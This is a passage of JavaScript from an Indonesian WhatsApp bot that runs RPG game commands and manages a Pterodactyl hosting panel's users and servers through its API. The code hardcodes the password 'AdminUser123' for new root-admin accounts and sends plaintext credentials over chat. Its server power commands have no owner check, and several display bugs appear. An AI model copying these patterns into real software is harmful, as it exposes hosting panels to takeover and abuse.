db.data.rpg[m.sender].sapi += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Sapi: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'domba':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 2000)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].domba += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Domba: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'ikan':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 200)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].ikan += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Ikan: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
default:
let teks = `------- » *🛍️ MARKET 🛍️* « -------

*Pilih Barang Yang*
*Akan Di Beli*
- emas
- besi
- batubara
- perak
- kayu
- ayam
- sapi
- domba
- ikan

*Contoh:*
${prefix + command} ikan

`
vreden.sendMessage(m.chat, {
text: teks,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "BUY AN ITEM",
body: 'Buy the necessary items',
thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
/*case 'buy': case 'beli': {
let [color, ...message] = text.split(' ');

}
break*/
case 'inventory': case 'inv': case 'profile': case 'profil': {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender
if (!db.data.users[users].rpg) return warning(`*User Belum Join RPG*\n\nketik _.joinrpg_`)
let nonya = await PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
let teks = `*⚔️ RPG - PROFILE ⚔️*

_*Crafting Item 🛠️*_
- Kapal: ${db.data.rpg[users].kapal ? `(${db.data.rpg[m.sender].darahkapal}% HP)` : 'Nothing'}
- Rumah: ${db.data.rpg[users].rumah} Unit
- Kapak: ${db.data.rpg[users].kapak ? `(${db.data.rpg[m.sender].darahkapak}% HP)` : 'Nothing'}
- Pickaxe: ${db.data.rpg[users].pickaxe ? `(${db.data.rpg[m.sender].darahpickaxe}% HP)` : 'Nothing'}
- Baju Zirah: ${db.data.rpg[users].bzirah ? `(${db.data.rpg[m.sender].darahbzirah}% HP)` : 'Nothing'}
- Pedang: ${db.data.rpg[users].pedang ? `(${db.data.rpg[m.sender].darahpedang}% HP)` : 'Nothing'}
- Kain: ${db.data.rpg[users].kain} Lembar

_*User About 🤺*_
- User Healthy: ${db.data.rpg[users].darahuser}/100
- Keberadaan: ${db.data.rpg[users].wilayah}

_*Sumber Daya 🧰*_
- Kayu: ${db.data.rpg[users].kayu} Batang
- Besi: ${db.data.rpg[users].besi} Biji
- Emas: ${db.data.rpg[users].emas} Biji
- Perak: ${db.data.rpg[users].perak} Biji
- Batubara: ${db.data.rpg[users].batubara} Biji

_*Hewan & Ternak🐄*_
- Ayam: ${db.data.rpg[users].ayam} Ekor
- Sapi: ${db.data.rpg[users].sapi} Ekor
- Domba: ${db.data.rpg[users].domba} Ekor
- Ikan: ${db.data.rpg[users].ikan} Ekor

> ID: ${nonya}
`
await vreden.sendMessage(m.chat, {
text: teks,
contextInfo:{ mentionedJid:[users], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG-GAME (Inventory)",
body: 'looking for supplies to survival',
thumbnailUrl: "https://telegra.ph/file/675903e8c4a42e1dd990b.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mingguan': {
if (isMingguan) {
let cekming = ms(_mingguan.getMingguanExpired(m.sender, mingguan) - Date.now())
 m.reply(`Kamu Sudah Mengambilnya Minggu Ini\nTunggu Selama ${cekming.days} Hari ${cekming.hours} Jam ${cekming.minutes} Menit Lagi`)
}
if (!isMingguan) {
lim = 10
let bal = 7000

let wak = '7d'
db.data.users[m.sender].saldo += parseInt(bal)
db.data.users[m.sender].limit += parseInt(lim)
m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${bal} \n- + ${lim} Limit\n\n`)
_mingguan.addMingguanUser(m.sender, wak, mingguan)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bulanan': {
if (isBulanan) {
let cekming = ms(_bulanan.getBulananExpired(m.sender, bulanan) - Date.now())
 m.reply(`Kamu Sudah Mengambilnya Bulan Ini\nTunggu Selama ${cekming.days} Hari ${cekming.hours} Jam ${cekming.minutes} Menit Lagi`)
}
if (!isBulanan) {
lim = 10
let bal = 7000

let wak = '30d'
db.data.users[m.sender].saldo += parseInt(bal)
db.data.users[m.sender].limit += parseInt(lim)
 m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${bal} \n- + ${lim} Limit\n\n`)
_bulanan.addBulananUser(m.sender, wak, bulanan)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addusradmin': {
if (!isCreator) return m.reply(mess.OnlyOwner)
let t = q.split(',');
if (t.length < 3) return m.reply(`${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let passwordnya = 'AdminUser123'
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": passwordnya
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await m.reply(`
*USER SUKSES DIBUAT*

id: ${user.id}
username: ${user.username}
email: ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`)
let txt = `
email: ${email}
username: ${username}
password: ${passwordnya}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${passwordnya}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listusr': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let page = args[0] ? args[0] : '1'
let f = await fetch(panel + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let res = await f.json();
let users = res.data
let sections = "*DATA USER PANEL*"
for (let user of users) {
let u = user.attributes
sections += `\n\n*${u.id}. ${u.username}*\n *User :* ${u.first_name} ${u.last_name}\n *Admin :* ${u.root_admin}\n *Bahasa :* ${u.language}`
}
vreden.sendMessage(m.chat, {
text: sections.trim(),
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'Pterodactly Panel',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png",
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listsrv': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let page = args[0] ? args[0] : '1'
let f = await fetch(panel + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let res = await f.json();
let servers = res.data
let sections = "*DATA SERVER PANEL*"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(panel + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + cred
}
})
let data = await f3.json();

sections += `\n\n*${s.id}.* Server : ${s.name}`
}
vreden.sendMessage(m.chat, {
text: sections.trim(),
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: botName,
body: 'Pterodactly Panel',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png",
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fconver})
}
break
case 'addusr': {
if (!isCreator) return tolakk(mess.OnlyOwner)
    
let t = q.split(',');
if (t.length < 3) return m.reply(`${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
//let password
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*PENGGUNAAN SALAH [!]*

Isi Data Anda Disini
${prefix + command} name@gmail.com,name,number\n\ncontoh : addusr vreden@gmail.com,vreden,${nomore}`);
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Member",
"root_admin": false,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await vreden.sendMessage(m.chat, { text: `
*USER SUKSES DIBUAT*

id: ${user.id}
username: ${user.username}
email: ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`, mentions:[u],
}, {quoted: m})
let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addsrv': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let s = q.split(',');
if (s.length < 7) return m.reply(`Format salah! silahkan isi data di bawah\nname,desc,userId,egg,locId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data = await f1.json();
//console.log(data.attributes.startup)
let startup_cmd = data.attributes.startup

let f = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESS CREATE SERVER*

*ID : ${server.id}*
UUID : ${server.uuid}
NAME : ${server.name}
DESC : ${server.description}
DISK : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
CPU : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
DATE : ${server.created_at}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsrv': {
if (!isCreator) return reply('cannot access')
let srv = args[0]
if (!srv) return m.reply('Input *ID* Server')
let f = await fetch(panel + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*NOT FOUND [!]*')
reply('*SERVER DI HAPUS [!]*')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delusr': {
if (!isCreator) return reply('this for creator')
let usr = args[0]
if (!usr) return m.reply('Input User *ID*')
let f = await fetch(panel + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
//let res = await f.json()
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*NOT FOUND*')
reply(`*${usr} DELETED*`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
let srv = args[0]
if (!srv) return m.reply('input *ID* from server')
let f = await fetch(panel + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"signal": action
})
})

let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`Sukses ${action.toUpperCase()} Server`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '1gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 1gb"
let egg = eggsnya
let loc = location
let memo = "1200"
let cpu = "30"
let disk = "1200"
let email = username + "1gb@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
const Kalender91 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '2gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 2gb"
let egg = eggsnya
let loc = location
let memo = "2200"
let cpu = "40"
let disk = "2200"
let email = username + "2gb@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '3gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 3gb"
let egg = eggsnya
let loc = location
let memo = "3200"
let cpu = "70"
let disk = "3200"
let email = username + "3gb@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '4gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 4gb"
let egg = eggsnya
let loc = location
let memo = "4200"
let cpu = "90"
let disk = "4200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '5gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 5gb"
let egg = eggsnya
let loc = location
let memo = "5200"
let cpu = "110"
let disk = "5200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
